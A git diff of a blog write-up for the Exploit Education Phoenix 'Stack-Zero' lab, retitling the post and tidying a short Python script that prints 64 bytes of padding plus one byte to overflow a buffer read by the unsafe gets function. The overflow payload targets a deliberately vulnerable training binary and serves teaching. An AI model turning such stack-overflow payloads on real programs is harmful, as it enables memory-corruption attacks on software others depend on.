@@ -1,5 +1,5 @@
 ---
-title: Stack-Zero
+title: Exploit Education > Phoenix > Stack-Zero
 date: '2021-09-20'
 draft: false
 --- 
@@ -57,8 +57,8 @@ Looking at the file, we can see that the code uses the vulnerable `gets` functio
 ``` 
 # stack-zero.py
 
-padding = '0' * 64;
-changeme = '\x1';
+padding = '0' * 64
+changeme = '\x1'
 
 print(padding + changeme)
 ```
